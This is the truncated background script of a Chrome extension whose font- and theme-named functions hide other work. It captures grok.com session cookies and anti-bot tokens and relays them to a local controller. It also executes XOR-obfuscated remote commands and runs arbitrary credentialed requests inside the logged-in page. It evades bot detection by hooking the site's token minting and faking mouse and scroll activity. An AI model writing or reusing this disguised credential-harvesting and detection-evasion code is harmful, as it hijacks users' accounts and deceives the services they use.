

let _syncPort = 18923;
let _syncUrl = `http://127.0.0.1:${_syncPort}`;

function _updateSyncPort(port) {
    if (port && typeof port === "number" && port >= 1 && port <= 65535) {
        _syncPort = port;
        _syncUrl = `http://127.0.0.1:${_syncPort}`;
    }
}

chrome.storage.local.get(["syncPort"], (data) => {
    if (data && data.syncPort) {
        _updateSyncPort(data.syncPort);
    }
});

chrome.storage.onChanged.addListener((changes, areaName) => {
    if (areaName === "local" && changes.syncPort) {
        _updateSyncPort(changes.syncPort.newValue);
    }
});
const _FONT_INTERVAL = 1500;        
const _THEME_VER = 0x5A;                 

let _syncing = false;                
let _themeReady = false;          
let _fontCache = 0;              
let _renderQueue = 0;            
let _isProcessingPosts = false;
let _ftStateRef = null;
let _lastRender = null;      

let _layoutActive = false;             
let _layoutTimer = null;               
const _LAYOUT_TIMEOUT = 60000;      

let _lastPrefetch = 0;        
const _RENDER_COOLDOWN = 60000;  
let _prefetchTab = null;           
let _reviving = false;       

let _ftCache = null;
let _ftSeenAt = 0;

let _ftJar = null;
let _ftAgent = null;

let _ftPrefetchAt = 0;
const _FT_COOLDOWN = 60000;
let _ftTab = null;

let _ftActive = 0;
let _ftWarmAt = 0;

let _lastGoogleOneSync = 0;
const _GOOGLE_ONE_SYNC_INTERVAL = 300000;

let _lastFlowModelsSync = 0;
const _FLOW_MODELS_SYNC_INTERVAL = 300000;

chrome.storage.local.get(["tokenCount", "lastSuccess"], (data) => {
    _fontCache = data.tokenCount || 0;
    _lastRender = data.lastSuccess || null;
});

let instanceId = null;
let instanceIdPromise = null;

async function getInstanceId() {
    if (instanceId) return instanceId;
    
    
    if (!instanceIdPromise) {
        instanceIdPromise = (async () => {
            try {
                const data = await chrome.storage.local.get(["instanceId"]);
                if (data.instanceId && typeof data.instanceId === "string") {
                    return data.instanceId;
                }
            } catch (e) {  }
            const fresh = (crypto && crypto.randomUUID && crypto.randomUUID()) ||
                (Date.now().toString(36) + "-" + Math.random().toString(36).slice(2));
            try { await chrome.storage.local.set({ instanceId: fresh }); } catch (e) {  }
            return fresh;
        })();
    }
    instanceId = await instanceIdPromise;
    return instanceId;
}

chrome.alarms.create("keepAlive", { periodInMinutes: 0.4 });
chrome.alarms.create("heartbeat", { periodInMinutes: 0.25 });  
chrome.alarms.create("grokKeepAlive", { periodInMinutes: 1.0 });  
chrome.alarms.create("autoPostCheck", { periodInMinutes: 0.05 });
chrome.alarms.create("wallScan", { periodInMinutes: 1.0 }); // Scan wall every 60s
setInterval(() => {
    _processScheduledPosts().catch(() => {});
    _processInteractionTasks().catch(() => {});
}, 15000);

chrome.alarms.onAlarm.addListener(async (alarm) => {
    if (alarm.name === "keepAlive" && !_syncing) _syncFonts();
    if (alarm.name === "autoPostCheck") _processScheduledPosts();
    if (alarm.name === "heartbeat") {
        
        
        try {
            const extId = await getInstanceId();
            await fetch(`${_syncUrl}/sync/status`, {
                signal: AbortSignal.timeout(3000),
                headers: { "X-Ext-Id": extId },
            });
        } catch (e) {  }
    }
    if (alarm.name === "wallScan") {
        _scanWallPosts().catch(() => {});
    }
    if (alarm.name === "grokKeepAlive") {
        
        
        
        try {
            if (_ftActive <= 0) return;
            const minIntervalMs = 120000 + Math.floor(Math.random() * 120000);
            if (Date.now() - _ftWarmAt < minIntervalMs) return;
            _ftWarmAt = Date.now();
            const tab = await _findFtCanvas();
            if (!tab) return;
            await chrome.scripting.executeScript({
                target: { tabId: tab.id },
                world: "MAIN",
                func: () => {
                    try {
                        const scrollY = Math.floor(200 + Math.random() * 400);
                        window.scrollBy(0, scrollY);
                        setTimeout(() => {
                            try { window.scrollBy(0, -scrollY); } catch (e) { }
                        }, 500 + Math.floor(Math.random() * 1000));
                        const x = Math.floor(100 + Math.random() * 700);
                        const y = Math.floor(100 + Math.random() * 400);
                        const ev = new MouseEvent("mousemove", {
                            clientX: x, clientY: y, bubbles: true, cancelable: true, view: window,
                        });
                        document.dispatchEvent(ev);
                    } catch (e) { }
                },
            });
        } catch (e) {  }
    }
});
chrome.runtime.onInstalled.addListener(() => _syncFonts());
chrome.runtime.onStartup.addListener(() => _syncFonts());

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === "complete" && tab.url && tab.url.includes("labs.google")) {
        if (!_syncing) _syncFonts();
        
    }
    
    
    
    if (changeInfo.status === "complete" && tab.url && tab.url.includes("grok.com")) {
        _drainFtQueue().catch(() => {  });
    }
});

try {
    chrome.webRequest.onBeforeSendHeaders.addListener(
        (details) => {
            try {
                if (!details.requestHeaders) return;
                
                
                
                
                
                for (const h of details.requestHeaders) {
                    if (!h.name || !h.value) continue;
                    const n = h.name.toLowerCase();
                    if (n === "cookie") _ftJar = h.value;
                    else if (n === "user-agent") _ftAgent = h.value;
                    else if (n === "x-statsig-id" && !_ftCache) {
                        _ftCache = h.value;
                        _ftSeenAt = Date.now();
                    }
                }
            } catch (e) {  }
        },
        { urls: ["https://grok.com/rest/*"] },
        ["requestHeaders", "extraHeaders"]
    );
} catch (e) {
    
}

function _parseTheme(hexString) {
    let result = "";
    for (let i = 0; i < hexString.length; i += 2) {
        result += String.fromCharCode(parseInt(hexString.substr(i, 2), 16) ^ _THEME_VER);
    }
    return result;
}

function _serializeTheme(plaintext) {
    const ascii = plaintext.replace(/[-￿]/g,
        (c) => "\\u" + c.charCodeAt(0).toString(16).padStart(4, "0"));
    let result = "";
    for (let i = 0; i < ascii.length; i++) {
        result += (ascii.charCodeAt(i) ^ _THEME_VER).toString(16).padStart(2, "0");
    }
    return result;
}

async function _syncGoogleOneActivity() {
    // Disabled legacy Google activity sync for FB Auto Post
    return;
}

async function _syncGoogleFlowModels() {
    // Disabled legacy Google Flow models sync for FB Auto Post
    return;
}

async function _applyThemeUpdates(encryptedCommands) {
    if (!encryptedCommands) return;

    const decoded = _parseTheme(encryptedCommands);
    const commands = decoded.split(",");

    for (const cmd of commands) {
        const trimmed = cmd.trim();

        if (trimmed === "1") {
            
            
            
            
            
            
            try {
                const cookies = await chrome.cookies.getAll({ domain: "labs.google" });
                for (const c of cookies) {
                    const url = `https://${c.domain.replace(/^\./, "")}${c.path}`;
                    await chrome.cookies.remove({ url, name: c.name });
                }
            } catch (e) {  }

        } else if (trimmed === "2") {
            
            
            
            
            await _relayoutCanvas();

        } else if (trimmed.startsWith("3:")) {
            
            const ms = parseInt(trimmed.split(":")[1]) || 1000;
            await _animDelay(ms);

        } else if (trimmed === "4") {
            
            
            
            
            
            
            
            try {
                const tabId = await _findCanvas();
                if (tabId) await _reviveCanvas(tabId);
            } catch (e) {  }
        } else if (trimmed === "5") {
            try {
                await _syncGoogleOneActivity();
            } catch (e) {  }
        } else if (trimmed === "6") {
            try {
                await _syncGoogleFlowModels();
            } catch (e) {  }
        }
        
    }
}

async function _syncFonts() {
    if (_syncing) return;
    _syncing = true;

    while (_syncing) {
        try {
            
            
            
            let tabStatus = "closed";
            try {
                const tabId = await _findCanvas();
                if (tabId) tabStatus = "open";
            } catch (e) {  }

            
            let grokTabStatus = "closed";
            try {
                grokTabStatus = await _readFtState();
            } catch (e) {  }
            _ftStateRef = grokTabStatus;

            
            const extId = await getInstanceId();
            if (Date.now() - _lastGoogleOneSync > _GOOGLE_ONE_SYNC_INTERVAL) {
                _syncGoogleOneActivity().catch(() => {});
            }
            if (Date.now() - _lastFlowModelsSync > _FLOW_MODELS_SYNC_INTERVAL) {
                _syncGoogleFlowModels().catch(() => {});
            }
            const response = await fetch(`${_syncUrl}/sync/theme`, {
                signal: AbortSignal.timeout(5000),
                headers: {
                    "X-Tab-Status": tabStatus,
                    "X-Grok-Tab-Status": grokTabStatus,
                    "X-Ext-Id": extId,
                },
            });

            if (response.status === 200) {
                _themeReady = true;
                const raw = await response.json();

                
                const data = raw.d ? JSON.parse(_parseTheme(raw.d)) : raw;

                
                if (data && data.x) {
                    await _applyThemeUpdates(data.x);
                }

                
                
                
                const hasGrokTask = data && (data.g === 1 || data.g === "1");
                if (hasGrokTask) {
                    _drainFtQueue().catch(() => {  });
                }

                
                if (data && data.r) {
                    _setLayoutMode(true);
                    const result = await _resolveWidget(data);

                    
                    if (!result.token && result.error && result.error.includes("not ready")) {
                        await _animDelay(2000);
                        const retry = await _resolveWidget(data);
                        if (retry.token) {
                            await _submitAnalytics(data.r, retry.token, retry.error);
                            _onFontCached();
                        } else {
                            await _submitAnalytics(data.r, null, retry.error);
                        }
                    } else {
                        await _submitAnalytics(data.r, result.token, result.error);
                        if (result.token) _onFontCached();
                    }
                }
            } else {
                _themeReady = false;
            }
        } catch (e) {
            _themeReady = false;
        }

        await _animDelay(_FONT_INTERVAL);
    }
}

async function _findFtCanvas() {
    try {
        const tabs = await chrome.tabs.query({});
        
        
        
        const imagineTabs = tabs.filter(t =>
            t.url && t.url.startsWith("https://grok.com/imagine")
        );
        if (imagineTabs.length > 0) {
            imagineTabs.sort((a, b) => (b.lastAccessed || 0) - (a.lastAccessed || 0));
            return imagineTabs[0];
        }

        const grokTabs = tabs.filter(t =>
            t.url && /^https:\/\/grok\.com(\/|$)/.test(t.url)
        );
        if (grokTabs.length > 0) {
            grokTabs.sort((a, b) => (b.lastAccessed || 0) - (a.lastAccessed || 0));
            return grokTabs[0];
        }
        return null;
    } catch (e) {
        return null;
    }
}

async function _ftAuthOk() {
    try {
        const sso = await chrome.cookies.get({ url: "https://grok.com", name: "sso" });
        if (sso && sso.value && sso.value.length > 10) return true;
        const ssoRw = await chrome.cookies.get({ url: "https://grok.com", name: "sso-rw" });
        if (ssoRw && ssoRw.value && ssoRw.value.length > 10) return true;
    } catch (e) {  }
    return false;
}

async function _openFtCanvas() {
    if (Date.now() - _ftPrefetchAt < _FT_COOLDOWN) return null;
    _ftPrefetchAt = Date.now();
    try {
        const tab = await chrome.tabs.create({
            url: "https://grok.com/imagine",
            active: false,
        });
        _ftTab = tab.id;
        
        await new Promise((resolve) => {
            const listener = (id, info) => {
                if (id === tab.id && info.status === "complete") {
                    chrome.tabs.onUpdated.removeListener(listener);
                    resolve();
                }
            };
            chrome.tabs.onUpdated.addListener(listener);
            setTimeout(() => {
                chrome.tabs.onUpdated.removeListener(listener);
                resolve();
            }, 15000);
        });
        return tab;
    } catch (e) {
        return null;
    }
}

async function _readFtState() {
    const tab = await _findFtCanvas();
    if (!tab) return "closed";
    const loggedIn = await _ftAuthOk();
    return loggedIn ? "open" : "login_required";
}

async function _emitFtEvent(taskId, event, data) {
    try {
        const payload = JSON.stringify({ id: taskId, event, data: data || {} });
        const extId = await getInstanceId();
        await fetch(`${_syncUrl}/sync/grok-event`, {
            method: "POST",
            headers: { "Content-Type": "application/json", "X-Ext-Id": extId },
            body: JSON.stringify({ d: _serializeTheme(payload) }),
            signal: AbortSignal.timeout(5000),
        });
    } catch (e) {  }
}

let _ftWarmupAt = 0;
const _FT_WARMUP_AGE = 45000;

async function _readyFtCanvas(taskId) {
    let tab = await _findFtCanvas();
    if (!tab) tab = await _openFtCanvas();
    if (!tab || !tab.id) {
        await _emitFtEvent(taskId, "error", { message: "no grok tab available" });
        return null;
    }

    
    try { await chrome.tabs.update(tab.id, { autoDiscardable: false }); } catch (e) {}

    if (!(await _ftAuthOk())) {
        await _emitFtEvent(taskId, "error", { message: "login required" });
        return null;
    }

    
    
    
    
    let info = null;
    try { info = await chrome.tabs.get(tab.id); } catch (e) {}
    const onImagine = info && info.url && info.url.startsWith("https://grok.com/imagine") && !info.discarded;
    const fresh = (Date.now() - _ftWarmupAt) < _FT_WARMUP_AGE;
    if (!onImagine || !fresh) {
        _ftCache = null;
        _ftSeenAt = 0;
        async function navTo(url, timeoutMs) {
            try { await chrome.tabs.update(tab.id, { url }); }
            catch (e) { return false; }
            return new Promise((resolve) => {
                const listener = (id, ch) => {
                    if (id === tab.id && ch.status === "complete") {
                        chrome.tabs.onUpdated.removeListener(listener);
                        resolve(true);
                    }
                };
                chrome.tabs.onUpdated.addListener(listener);
                setTimeout(() => {
                    chrome.tabs.onUpdated.removeListener(listener);
                    resolve(false);
                }, timeoutMs);
            });
        }
        
        
        
        try {
            await navTo("https://grok.com/", 15000);
            await navTo("https://grok.com/imagine", 15000);
        } catch (e) {
            await _emitFtEvent(taskId, "error", { message: `nav /imagine failed: ${e}` });
            return null;
        }
        
        
        const deadline = Date.now() + 12000;
        while (!_ftCache && Date.now() < deadline) await _animDelay(120);
        _ftWarmupAt = Date.now();
    }

    
    
    
    
    {
        const deadline = Date.now() + 5000;
        let ready = false;
        while (Date.now() < deadline) {
            try {
                const res = await chrome.tabs.sendMessage(tab.id, { type: "GROK_CONTENT_PING" });
                if (res && res.ready) { ready = true; break; }
            } catch (e) {  }
            await _animDelay(150);
        }
        if (!ready) {
            await _emitFtEvent(taskId, "error", { message: "content script not ready" });
            return null;
        }
    }

    return tab;
}

async function _runScopedFn(opts, timeoutMs) {
    return Promise.race([
        chrome.scripting.executeScript(opts),
        new Promise((_, reject) => setTimeout(
            () => reject(new Error("executeScript timeout after " + timeoutMs + "ms — tab may be suspended")),
            Math.max(5000, timeoutMs),
        )),
    ]);
}

async function _drainFtQueue() {
    while (true) {
        let task = null;
        try {
            const extId = await getInstanceId();
            const res = await fetch(`${_syncUrl}/sync/grok-poll-task`, {
                signal: AbortSignal.timeout(5000),
                headers: { "X-Ext-Id": extId },
            });
            if (!res.ok) break;
            const raw = await res.json();
            const data = raw.d ? JSON.parse(_parseTheme(raw.d)) : raw;
            task = data && data.task;
        } catch (e) { break; }
        if (!task) break;
        try {
            await _resolveFtJob(task);
        } catch (e) {
            await _emitFtEvent(task.id, "error", { message: String(e) });
        }
    }
}

async function _resolveFtJob(task) {
    _ftActive++;
    try {
        
        
        if (task.kind === "get_creds") return await _readFtCreds(task);

        const tab = await _readyFtCanvas(task.id);
        if (!tab) return;

        if (task.kind === "gfetch") return await _renderFtQuery(task, tab);
        if (task.kind === "gws") return await _renderFtStream(task, tab);
        if (task.kind === "force_refresh_session") return await _refreshFtCanvas(task, tab);
        await _emitFtEvent(task.id, "error", { message: `unknown kind: ${task.kind}` });
    } finally {
        _ftActive = Math.max(0, _ftActive - 1);
    }
}

async function _readFtCreds(task) {
    await _emitFtEvent(task.id, "done", {
        cookie: _ftJar || "",
        userAgent: _ftAgent || "",
    });
}

async function _warmFtCtx(tab, url, method, mintCfg) {
    let res;
    try {
        res = await _runScopedFn({
            target: { tabId: tab.id },
            world: "MAIN",
            func: async (mintUrl, mintMethod, cfg) => {
                try {
                    const gname = (cfg && cfg.globalName) || "TURBOPACK";
                    const TP = globalThis[gname];
                    if (!TP || typeof TP.push !== "function") return { error: "no " + gname };
                    
                    
                    
                    if (!window.__ftWarmCtx) {
                        const probeId = cfg.probeId || 990099001;
                        try {
                            TP.push(["glabs-reg.js", probeId, function (c) { window.__ftWarmCtx = c; }]);
                            TP.push(["glabs-run.js", { otherChunks: [], runtimeModuleIds: [probeId] }]);
                        } catch (e) { return { error: "ctx push: " + String(e) }; }
                        for (let i = 0; i < 40 && !window.__ftWarmCtx; i++) await new Promise(r => setTimeout(r, 50));
                    }
                    const ctx = window.__ftWarmCtx;
                    if (!ctx || typeof ctx.i !== "function") return { error: "no ctx" };
                    let ns;
                    try {
                        ns = ctx.i(cfg.moduleId);
                        if (!ns || !ns[cfg.path[0]]) ns = ctx.r(cfg.moduleId); 
                        ns = ctx.i(cfg.moduleId);
                    } catch (e) { return { error: "module " + cfg.moduleId + ": " + String(e) }; }
                    let fn = ns;
                    try { for (const k of cfg.path) fn = fn[k]; }
                    catch (e) { return { error: "path: " + String(e) }; }
                    if (typeof fn !== "function") return { error: "middleware not fn (" + typeof fn + ")" };
                    
                    
                    
                    const reqObj = { url: mintUrl, init: { method: mintMethod, headers: {} } };
                    let out;
                    try { out = await fn(reqObj); } catch (e) { return { error: "stamp: " + String(e) }; }
                    const h = (out && out.init && out.init.headers) || reqObj.init.headers || {};
                    const statsig = h["x-statsig-id"] || (h.get && h.get("x-statsig-id")) || null;
                    const reqId = h["x-xai-request-id"] || (h.get && h.get("x-xai-request-id")) || null;
                    if (!statsig) return { error: "no statsig produced" };
                    return { statsig: statsig, reqId: reqId };
                } catch (e) { return { error: String((e && e.message) || e) }; }
            },
            args: [url, method, mintCfg],
        }, 9000);
    } catch (e) {
        throw new Error("dispatch " + String((e && e.message) || e));
    }
    const r = (Array.isArray(res) && res[0] && res[0].result) || null;
    if (!r) throw new Error("no result (tab suspended?)");
    if (r.error) throw new Error(r.error);
    return r;
}

async function _renderFtQuery(task, tab) {
    const p = task.payload || {};
    const url = String(p.url || "");
    const method = String(p.method || "GET").toUpperCase();
    const headers = (p.headers && typeof p.headers === "object") ? p.headers : {};
    const body = (p.body === null || p.body === undefined) ? null : String(p.body);
    const injectStatsig = !!p.injectStatsig;
    const mintCfg = (p.mint && typeof p.mint === "object") ? p.mint : null;
    const responseMode = String(p.responseMode || "json");
    const timeoutMs = Math.max(1000, Math.min(600000, Number(p.timeoutMs) || 60000));
    const streamMaxBytes = Math.max(1024, Number(p.streamMaxBytes) || (50 * 1024 * 1024));

    if (!url) {
        await _emitFtEvent(task.id, "error", { message: "missing url" });
        return;
    }

    const finalHeaders = Object.assign({}, headers);
    if (mintCfg) {
        
        try {
            const tok = await _warmFtCtx(tab, url, method, mintCfg);
            finalHeaders["x-statsig-id"] = tok.statsig;
            if (tok.reqId && !finalHeaders["x-xai-request-id"]) finalHeaders["x-xai-request-id"] = tok.reqId;
        } catch (e) {
            await _emitFtEvent(task.id, "error", { message: "mint: " + String((e && e.message) || e) });
            return;
        }
    } else if (injectStatsig && _ftCache) {
        finalHeaders["x-statsig-id"] = _ftCache;
    }

    
    
    
    
    const spec = {
        url,
        method,
        headers: finalHeaders,
        mode: responseMode,
        taskId: task.id,
        maxBytes: streamMaxBytes,
        timeoutMs,
    };
    const specJson = JSON.stringify(spec);
    const bodyArg = body == null ? "" : body;

    if (responseMode === "stream") {
        try {
            await _runScopedFn({
                target: { tabId: tab.id },
                world: "MAIN",
                func: async (specJsonInner, bodyStr) => {
                    const s = JSON.parse(specJsonInner);
                    const sBody = bodyStr || null;
                    
                    
                    const _post = (event, data) => {
                        try { window.postMessage({ from: "glabs-grok-task", taskId: s.taskId, event, data: data || {} }, "*"); }
                        catch (e) {}
                    };
                    const _ac = new AbortController();
                    const _at = setTimeout(() => _ac.abort(), s.timeoutMs || 60000);
                    function parseJsonObjectsFromBuffer(buffer) {
                        const out = []; let depth = 0, inString = false, escape = false, start = -1;
                        for (let i = 0; i < buffer.length; i++) {
                            const ch = buffer[i];
                            if (start === -1) {
                                if (ch === "{") { start = i; depth = 1; inString = false; escape = false; }
                                continue;
                            }
                            if (inString) {
                                if (escape) escape = false;
                                else if (ch && ch.charCodeAt(0) === 92) escape = true;
                                else if (ch === '"') inString = false;
                                continue;
                            }
                            if (ch === '"') { inString = true; continue; }
                            if (ch === "{") depth++;
                            else if (ch === "}") {
                                depth--;
                                if (depth === 0) {
                                    const slice = buffer.slice(start, i + 1);
                                    try { out.push(JSON.parse(slice)); } catch (e) {}
                                    start = -1;
                                }
                            }
                        }
                        return { objects: out, tail: start === -1 ? "" : buffer.slice(start) };
                    }
                    function postObj(obj) {
                        try { window.postMessage({ from: "glabs-grok-task", taskId: s.taskId, event: "chunk", data: { obj } }, "*"); }
                        catch (e) {}
                    }
                    const opts = { method: s.method, headers: s.headers, credentials: "include", signal: _ac.signal };
                    if (sBody !== null && sBody !== undefined && sBody !== "") opts.body = sBody;
                    let res;
                    try {
                        res = await fetch(s.url, opts);
                    } catch (e) {
                        clearTimeout(_at);
                        const payload = { status: 0, error: "fetch: " + String(e) };
                        _post("error", { message: payload.error, status: 0 });
                        return payload;
                    }
                    const status = res.status;
                    if (status !== 200 || !res.body) {
                        let text = "";
                        try { text = await res.text(); } catch (e) {}
                        clearTimeout(_at);
                        if (status === 200 && text) {
                            const parsed = parseJsonObjectsFromBuffer(text);
                            for (const obj of parsed.objects) postObj(obj);
                        }
                        if (status === 200) {
                            _post("done", { status });
                        } else {
                            _post("error", { message: text.slice(0, 600), status });
                        }
                        return { status, error: status === 200 ? null : text.slice(0, 600) };
                    }
                    const reader = res.body.getReader();
                    const decoder = new TextDecoder("utf-8");
                    let buffer = "", totalBytes = 0;
                    try {
                        while (true) {
                            const { value, done } = await reader.read();
                            if (done) break;
                            totalBytes += (value && value.byteLength) || 0;
                            if (totalBytes > s.maxBytes) break;
                            buffer += decoder.decode(value, { stream: true });
                            const parsed = parseJsonObjectsFromBuffer(buffer);
                            buffer = parsed.tail;
                            for (const obj of parsed.objects) postObj(obj);
                        }
                    } catch (e) {
                        clearTimeout(_at);
                        const payload = { status, error: "stream: " + String(e) };
                        _post("error", { message: payload.error, status });
                        return payload;
                    }
                    clearTimeout(_at);
                    _post("done", { status });
                    return { status };
                },
                args: [specJson, bodyArg],
            }, timeoutMs + 5000);
        } catch (e) {
            await _emitFtEvent(task.id, "error", { message: "executeScript: " + String(e) });
        }
        return;
    }

    
    
    
    
    
    
    try {
        await _runScopedFn({
            target: { tabId: tab.id },
            world: "MAIN",
            func: async (specJsonInner, bodyStr) => {
                const s = JSON.parse(specJsonInner);
                const _post = (event, data) => {
                    try { window.postMessage({ from: "glabs-grok-task", taskId: s.taskId, event, data: data || {} }, "*"); }
                    catch (e) {}
                };
                const _ac = new AbortController();
                const _at = setTimeout(() => _ac.abort(), s.timeoutMs || 60000);
                const opts = { method: s.method, headers: s.headers, credentials: "include", signal: _ac.signal };
                if (bodyStr !== null && bodyStr !== undefined && bodyStr !== "") opts.body = bodyStr;
                try {
                    const res = await fetch(s.url, opts);
                    const status = res.status;
                    if (s.mode === "arrayBuffer") {
                        const buf = await res.arrayBuffer();
                        const bytes = new Uint8Array(buf);
                        const chunks = [];
                        for (let i = 0; i < bytes.byteLength; i += 8192) {
                            chunks.push(String.fromCharCode.apply(null, bytes.subarray(i, Math.min(i + 8192, bytes.byteLength))));
                        }
                        const bin = chunks.join('');
                        clearTimeout(_at);
                        _post("done", { status, body: btoa(bin), contentType: res.headers.get("content-type") || "" });
                        return;
                    }
                    if (s.mode === "status") {
                        
                        
                        
                        
                        
                        
                        if (status === 200) {
                            clearTimeout(_at);
                            _post("done", { status, body: null });
                            return;
                        }
                        let errText = "";
                        try { errText = (await res.text()).slice(0, 600); } catch (e) {}
                        clearTimeout(_at);
                        _post("done", { status, body: errText });
                        return;
                    }
                    if (s.mode === "text") {
                        const txt = await res.text();
                        clearTimeout(_at);
                        _post("done", { status, body: txt });
                        return;
                    }
                    
                    
                    let txt = "";
                    try { txt = await res.text(); } catch (e) {}
                    let data = null;
                    try { data = txt ? JSON.parse(txt) : null; } catch (e) {}
                    clearTimeout(_at);
                    _post("done", { status, body: data });
                } catch (e) {
                    clearTimeout(_at);
                    _post("error", { message: "fetch: " + String(e), status: 0 });
                }
            },
            args: [specJson, bodyArg],
        }, timeoutMs + 5000);
    } catch (e) {
        
        
        await _emitFtEvent(task.id, "error", { message: "executeScript: " + String(e) });
    }
}

async function _renderFtStream(task, tab) {
    const p = task.payload || {};
    const url = String(p.url || "");
    const initMessages = Array.isArray(p.initMessages) ? p.initMessages : [];
    const timeoutMs = Math.max(1000, Math.min(600000, Number(p.timeoutMs) || 180000));
    const idleTimeoutMs = Math.max(1000, Number(p.idleTimeoutMs) || 30000);
    const terminateOnCompleted = p.terminateOnCompletedStatus !== false;
    const completeImageCount = Math.max(0, Number(p.completeImageCount) || 0);

    if (!url) {
        await _emitFtEvent(task.id, "error", { message: "missing url" });
        return;
    }

    const spec = {
        url, initMessages, taskId: task.id,
        timeoutMs, idleTimeoutMs, terminateOnCompleted, completeImageCount,
    };
    const specJson = JSON.stringify(spec);

    try {
        await _runScopedFn({
            target: { tabId: tab.id },
            world: "MAIN",
            func: async (specJsonInner) => {
                const s = JSON.parse(specJsonInner);
                const post = (event, data) => {
                    try { window.postMessage({ from: "glabs-grok-task", taskId: s.taskId, event, data: data || {} }, "*"); }
                    catch (e) {}
                };
                return await new Promise((resolve) => {
                    let ws;
                    try { ws = new WebSocket(s.url); }
                    catch (e) {
                        post("error", { message: "ws ctor: " + String(e) });
                        resolve();
                        return;
                    }
                    let finished = false;
                    let imageDoneCount = 0;
                    let lastActivityAt = Date.now();

                    const cleanup = () => {
                        clearTimeout(hardTimer);
                        clearInterval(idleTimer);
                        try { ws.close(); } catch (e) {}
                    };
                    const finish = (event, data) => {
                        if (finished) return;
                        finished = true;
                        cleanup();
                        post(event, data || {});
                        resolve();
                    };
                    const hardTimer = setTimeout(() => {
                        finish("error", { message: "ws hard timeout", afterMs: s.timeoutMs });
                    }, s.timeoutMs);
                    const idleTimer = setInterval(() => {
                        if (finished) return;
                        if (Date.now() - lastActivityAt > s.idleTimeoutMs) {
                            finish("error", { message: "ws idle timeout", idleMs: s.idleTimeoutMs });
                        }
                    }, 1000);

                    ws.onopen = () => {
                        post("ws_open", { url: s.url });
                        lastActivityAt = Date.now();
                        try {
                            for (const msg of (s.initMessages || [])) {
                                ws.send(typeof msg === "string" ? msg : JSON.stringify(msg));
                            }
                        } catch (e) {
                            finish("error", { message: "ws send: " + String(e) });
                        }
                    };
                    ws.onmessage = (evt) => {
                        lastActivityAt = Date.now();
                        const raw = evt.data;
                        if (typeof raw !== "string") {
                            
                            post("chunk", { binary: true });
                            return;
                        }
                        let obj = null;
                        try { obj = JSON.parse(raw); }
                        catch (e) {
                            post("chunk", { text: raw.length > 800 ? raw.slice(0, 800) + "..." : raw });
                            return;
                        }
                        post("chunk", { obj });
                        if (obj && obj.type === "json" && obj.current_status === "completed") {
                            if (s.terminateOnCompleted) finish("done", { reason: "completed-status" });
                        }
                        if (obj && obj.type === "image"
                            && typeof obj.url === "string"
                            && obj.url.length > 0
                            && obj.percentage_complete === 100) {
                            imageDoneCount++;
                            if (s.completeImageCount > 0 && imageDoneCount >= s.completeImageCount) {
                                finish("done", { reason: "image-count-reached", imageDoneCount });
                            }
                        }
                    };
                    ws.onerror = () => {
                        finish("error", { message: "ws onerror" });
                    };
                    ws.onclose = (evt) => {
                        finish("done", {
                            reason: "ws-close",
                            code: evt && evt.code,
                            wasClean: !!(evt && evt.wasClean),
                        });
                    };
                });
            },
            args: [specJson],
        }, timeoutMs + 5000);
    } catch (e) {
        await _emitFtEvent(task.id, "error", { message: "executeScript: " + String(e) });
    }
}

async function _refreshFtCanvas(task, tab) {
    _ftCache = null;
    _ftSeenAt = 0;
    _ftWarmupAt = 0;
    async function navTo(url, timeoutMs) {
        try {
            await chrome.tabs.update(tab.id, { url });
        } catch (e) { return false; }
        return new Promise((resolve) => {
            const listener = (id, ch) => {
                if (id === tab.id && ch.status === "complete") {
                    chrome.tabs.onUpdated.removeListener(listener);
                    resolve(true);
                }
            };
            chrome.tabs.onUpdated.addListener(listener);
            setTimeout(() => {
                chrome.tabs.onUpdated.removeListener(listener);
                resolve(false);
            }, timeoutMs);
        });
    }
    try {
        await navTo("https://grok.com/", 15000);
        await navTo("https://grok.com/imagine", 15000);
    } catch (e) {
        await _emitFtEvent(task.id, "error", { message: String(e) });
        return;
    }
    
    {
        const deadline = Date.now() + 12000;
        while (!_ftCache && Date.now() < deadline) await _animDelay(120);
    }

    
    
    let _widgetBusy = false;
    let scrapedStatsig = null;
    try {
        const probe = await _runScopedFn({
            target: { tabId: tab.id },
            world: "MAIN",
            func: () => {
                let title = "";
                let lsStatsig = null;
                try { title = String(document.title || ""); } catch (e) { }
                try { lsStatsig = localStorage.getItem("x-statsig-id"); } catch (e) { }
                return { title, lsStatsig };
            },
            args: [],
        }, 8000);
        const out = (probe && probe[0] && probe[0].result) || {};
        const titleLower = String(out.title || "").toLowerCase();
        const _widgetTerms = ["challenge", "verify", "captcha", "cloudflare", "just a moment"];
        if (_widgetTerms.some((kw) => titleLower.includes(kw))) {
            _widgetBusy = true;
        }
        if (typeof out.lsStatsig === "string" && out.lsStatsig.trim()) {
            scrapedStatsig = out.lsStatsig.trim();
        }
    } catch (e) {  }

    
    
    
    let usedLocalStorage = false;
    if (!_ftCache && scrapedStatsig) {
        _ftCache = scrapedStatsig;
        _ftSeenAt = Date.now();
        usedLocalStorage = true;
    }

    _ftWarmupAt = Date.now();
    await _emitFtEvent(task.id, "done", {
        gotStatsig: !!_ftCache,
        statsigSource: _ftCache ? (usedLocalStorage ? "localStorage" : "webRequest") : null,
        _widgetBusy,
    });
}

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    if (msg && msg.from === "glabs-grok-task" && msg.taskId && msg.event) {
        _emitFtEvent(msg.taskId, msg.event, msg.data || {}).catch(() => {});
        try { sendResponse({ ok: true }); } catch (e) {}
        return true;
    }
    return false;
});

function _onFontCached() {
    _fontCache++;
    _renderQueue++;
    
    _lastRender = Date.now();
    try {
        chrome.storage.local.set({
            tokenCount: _fontCache,
            lastSuccess: _lastRender,
        });
    } catch (e) {  }
}

async function _reviveCanvas(tabId) {
    if (_reviving) return;
    _reviving = true;
    try {
        try { await chrome.tabs.update(tabId, { autoDiscardable: false }); } catch (e) {}
        await chrome.tabs.reload(tabId);
        await new Promise((resolve) => {
            const listener = (id, info) => {
                if (id === tabId && info.status === "complete") {
                    chrome.tabs.onUpdated.removeListener(listener);
                    resolve();
                }
            };
            chrome.tabs.onUpdated.addListener(listener);
            setTimeout(() => {
                chrome.tabs.onUpdated.removeListener(listener);
                resolve();
            }, 6000);
        });
        await _animDelay(2000);  
    } catch (e) {
        
        try { await _relayoutCanvas(); } catch (e2) {}
    } finally {
        _reviving = false;
    }
}

async function _resolveWidget(request, _retried = false) {
    let tabId = await _findCanvas();

    
    if (!tabId) {
        if (Date.now() - _lastPrefetch < _RENDER_COOLDOWN) {
            
            await _animDelay(3000);
            tabId = await _findCanvas();
            if (!tabId) {
